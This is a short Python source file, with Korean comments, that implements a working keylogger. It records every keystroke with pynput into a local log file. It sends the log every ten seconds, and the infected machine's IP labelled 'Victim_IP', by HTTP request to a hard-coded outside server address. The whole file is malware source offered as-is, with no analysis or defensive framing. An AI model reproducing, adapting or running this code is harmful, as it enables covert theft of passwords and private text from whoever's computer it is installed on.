import threading
import requests
import socket
from pynput.keyboard import Listener

# 주기 설정을 위한 전역 변수
send_interval = 10
timer = None  # 타이머 객체

def get_ip_address():
    try:
        # 호스트 이름을 가져와서 IP 주소를 얻음
        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        return ip_address
    except socket.error as e:
        return None

def start_timer():
    global timer
    # 주기적인 로그 전송을 위한 타이머 시작
    timer = threading.Timer(send_interval, send_log)
    timer.start()

def send_log():
    with open("log.txt", "r") as f:
        log_content = f.read()

    # log.txt 내용을 전송하기 위한 HTTP GET 요청
    try:
        response = requests.get("http://1.230.60.108:8080/test.jsp", params={"data": log_content})
        if response.status_code == 200:
            # 로그가 성공적으로 전송되면 log.txt 파일 초기화
            open("log.txt", "w").close()
        else:
            pass
    except requests.RequestException as e:
        pass

    # 다음 log 전송을 위해 타이머를 시작
    start_timer()

def keystorkes(key):
    key = str(key).replace("'", "")

    if key == "Key.space":
        key = " "
    if key == "Key.shift_r":
        key = ""
    if key == "Key.enter":
        key = "\n"

    with open("log.txt", "a") as f:
        f.write(key)

# IP 주소 출력
ip_address = get_ip_address()
if ip_address:
        response = requests.get("http://1.230.60.108:8080/test.jsp", params={"data": '[!] Victim_IP: '+ip_address})



with Listener(on_press = keystorkes) as l:
    start_timer()
    l.join()
